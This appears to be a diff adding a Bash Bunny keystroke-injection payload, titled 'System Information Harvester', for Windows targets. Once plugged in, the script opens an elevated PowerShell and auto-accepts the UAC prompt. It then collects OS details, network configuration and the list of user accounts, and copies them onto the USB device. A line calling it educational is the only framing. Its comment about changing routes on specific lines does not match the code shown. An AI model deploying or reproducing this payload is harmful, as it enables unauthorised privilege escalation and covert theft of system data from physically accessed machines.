@@ -1,0 +1,41 @@
+#!/bin/bash
+# Title: System Information Harvester
+# Description: Collect system information such as OS, network config, and users.
+# Author: jjarque1
+# Target: Windows
+# Payload developed for educational purposes only
+# Don't forget to change the default route to the target machine route on lines 24, 26, 28 and 32
+
+# Set HID and storage attack modes
+ATTACKMODE HID STORAGE
+
+# Open PowerShell as administrator
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell Start-Process powershell -Verb runAs
+QUACK ENTER
+QUACK DELAY 1000
+
+# Confirm admin privileges if UAC is enabled
+QUACK ALT y
+QUACK DELAY 1000
+
+# Collect system information
+QUACK STRING Get-ComputerInfo > C:\\Users\\Public\\Documents\\sysinfo.txt
+QUACK ENTER
+QUACK STRING ipconfig /all >> C:\\Users\\Public\\Documents\\sysinfo.txt
+QUACK ENTER
+QUACK STRING net user >> C:\\Users\\Public\\Documents\\sysinfo.txt
+QUACK ENTER
+
+# Copy the sysinfo file to the Bash Bunny storage
+QUACK STRING copy C:\\Users\\Public\\Documents\\sysinfo.txt E:\\sysinfo.txt
+QUACK ENTER
+QUACK DELAY 1000
+
+# Exit PowerShell
+QUACK STRING exit
+QUACK ENTER
+
+# Eject the USB Bash Bunny
+ATTACKMODE OFF
